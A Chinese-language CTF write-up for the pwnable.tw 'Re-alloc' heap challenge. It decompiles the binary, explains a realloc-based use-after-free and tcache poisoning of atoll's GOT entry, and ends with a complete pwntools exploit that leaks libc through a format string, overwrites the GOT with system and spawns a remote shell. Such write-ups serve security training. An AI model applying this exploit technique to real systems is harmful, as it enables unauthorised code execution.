# pwnable.tw Re-alloc

### 0x1 分析

看一下开启的保护：

```shell
➜  Re-alloc checksec re-alloc
[*] './Re-alloc/re-alloc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

地址固定，GOT没有被写死。

看一下程序逻辑：

`menu()`:

```c
int menu()
{
  puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
  puts(&byte_402070);
  puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
  puts("$   1. Alloc               $");
  puts("$   2. Realloc             $");
  puts("$   3. Free                $");
  puts("$   4. Exit                $");
  puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$");
  return printf("Your choice: ");
}
```

分配、重新分配（edit）、释放、。

分配函数`allocate()`

```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *chunk; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )                     // 0 / 1
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )                         // Fastbin
    {
      chunk = realloc(0LL, size);
      if ( chunk )
      {
        heap[v2] = chunk;
        printf("Data:");
        v0 = (char *)heap[v2] + read_input((__int64)heap[v2], size);
        *v0 = 0;                                // off by one
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (signed int)v0;
}
```

只能分配两个chunk。且在Fastbin范围内。

`edit()`即`reallocate()`

```c
int reallocate()
{
  unsigned __int64 idx; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  idx = read_long();
  if ( idx > 1 || !heap[idx] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc(heap[idx], size);
  if ( !v3 )
    return puts("alloc error");
  heap[idx] = v3;
  printf("Data:");
  return read_input((__int64)heap[idx], size);
}
```

由`realloc()`来重新分配空间来编辑的。也可以用它来释放空间造成UAF

`rfree()`:没什么东西，都清零了。

```c
int rfree()
{
  void **v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc(heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (signed int)v0;
}
```

#### 漏洞利用

在编辑函数里，可以将`size`置为`0`，就可以`free`，从而得到一个UAF漏洞。

那么，在两个Tcachebin里面制造一个指向`atoll`的GOT，来泄漏`libc`和修改它为`system`。

关于泄漏地址，我们可以用`atoll`指向`printf`，来构造一个`FMT`漏洞泄漏。

**Tcache机制这里并没有额外的检查，拿到bin的idx，就可以直接拿到我们想要的地址了**

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')


# p = process(['/tmp/glibc/2.29/64/lib/ld-2.29.so','./re-alloc'],  env = {'LD_PRELOAD' : './libc.so'})
p = remote('chall.pwnable.tw', 10106)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so')
elf = ELF('./re-alloc')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

def alloc(index, size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Index:", str(index))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", data)

def realloc(index, size, data):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Index:", str(index))
    p.sendlineafter("Size:", str(size))
    if size != 0:
        p.sendafter("Data:", data)

def free(index):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Index:", str(index))

bss = elf.bss()
atoll_got = elf.got["atoll"]
atoll_plt = elf.plt["atoll"]
printf_plt = elf.plt["printf"]

# tcache[0x20] -> atoll_got
alloc(0, 0x18, "aaa")
realloc(0, 0, "")
realloc(0, 0x18, p64(atoll_got))
alloc(1, 0x18, "aaa")

# heap[0] == heap[1] == NULL
realloc(0, 0x38, "aaa")
free(0)
realloc(1, 0x38, "a" * 0x10)
free(1)

# tcache[0x50] -> atoll_got
alloc(0, 0x48, "aaa")
realloc(0, 0, "")
realloc(0, 0x48, p64(atoll_got))
alloc(1, 0x48, "aaa")

# heap[0] == heap[1] == NULL
realloc(0, 0x58, "aaa")
free(0)
realloc(1, 0x58, "a" * 0x10)
free(1)

alloc(0, 0x48, p64(printf_plt))
# gdb.attach(p, 'b *0x40129D\n')
p.sendlineafter("Your choice: ", "3")
# pause()
p.sendlineafter("Index:", "%21$p")

main_ret = int(p.recv(14), 16)
libc_base = main_ret - (libc.symbols["__libc_start_main"] + 0xeb)
libc.address = libc_base
system = libc.sym['system']

success("main_ret: " + hex(main_ret))
success("libc_base: " + hex(libc_base))
success("system: " + hex(system))
success("got: " + hex(atoll_got))

p.sendlineafter("Your choice: ", "1")
p.sendlineafter("Index:", "A\x00")
p.sendafter("Size:", "A" * 15 + "\x00")
p.sendafter("Data:", p64(system))

# get shell
p.sendlineafter("Your choice: ", "3")
p.sendlineafter("Index:", "/bin/sh\x00")
p.send('ls\n')
p.interactive()#
```

